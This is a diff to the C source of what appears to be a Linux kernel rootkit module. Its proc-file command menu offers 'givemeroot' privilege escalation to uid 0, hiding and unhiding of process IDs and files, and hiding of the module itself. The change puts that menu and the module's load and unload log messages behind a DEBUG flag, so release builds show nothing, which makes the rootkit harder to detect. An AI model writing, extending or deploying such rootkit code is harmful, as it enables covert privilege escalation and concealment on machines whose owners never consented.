@@ -141,6 +141,7 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
 
     if(count == 0)
     {
+#ifdef DEBUG
         sprintf(module_status,
             "CMDS: \n\
         -> givemeroot  - uid and gid 0 for writing process \n\
@@ -154,6 +155,10 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
         ->------------------------------------------------- \n\
         -> Files hidden?:: %d \n\
         -> Module hidden?: %d \n", hide_files, hide_module);
+#else
+        sprintf(module_status, " ");
+#endif
+
         size = strlen(module_status);
         temp = size;
     }
@@ -236,19 +241,24 @@ static int __init procfs_init(void)
     if(proc_rk == NULL)
         return 0;
 
-    sprintf(module_status,
-        "CMDS: \n\
-    -> givemeroot  - uid and gid 0 for writing process \n\
-    ->------------------------------------------------- \n\
-    -> dhprocXXXX  - Hide pid from view/tasklist \n\
-    -> uhprocXXXX  - Unhide pid from view/tasklist \n\
-    ->------------------------------------------------- \n\
-    -> thfile      - toggle hidden files \n\
-    -> dhmodu      - Hide module from view \n\
-    -> uhmodu      - Unhude module from view \n\
-    ->------------------------------------------------- \n\
-    -> Files hidden?:: %d \n\
-    -> Module hidden?: %d \n", hide_files, hide_module);
+#ifdef DEBUG
+        sprintf(module_status,
+            "CMDS: \n\
+        -> givemeroot  - uid and gid 0 for writing process \n\
+        ->------------------------------------------------- \n\
+        -> dhprocXXXX  - Hide pid from view/tasklist \n\
+        -> uhprocXXXX  - Unhide pid from view/tasklist \n\
+        ->------------------------------------------------- \n\
+        -> thfile      - toggle hidden files \n\
+        -> dhmodu      - Hide module from view \n\
+        -> uhmodu      - Unhude module from view \n\
+        ->------------------------------------------------- \n\
+        -> Files hidden?:: %d \n\
+        -> Module hidden?: %d \n", hide_files, hide_module);
+#else
+        sprintf(module_status, "\0");
+#endif
+
     size = strlen(module_status);
     temp = size;
 
@@ -314,7 +324,9 @@ static void fs_clean(void)
 
 static int __init rk_init(void)
 {
+#ifdef DEBUG
     printk("Adding Module!\n");
+#endif
     if(!procfs_init() || !fs_init())
     {
         procfs_clean();
@@ -328,7 +340,9 @@ static int __init rk_init(void)
 
 static void __exit rk_exit(void)
 {
+#ifdef DEBUG
     printk("Removing Module!\n");
+#endif
     procfs_clean();
     fs_clean();
 }
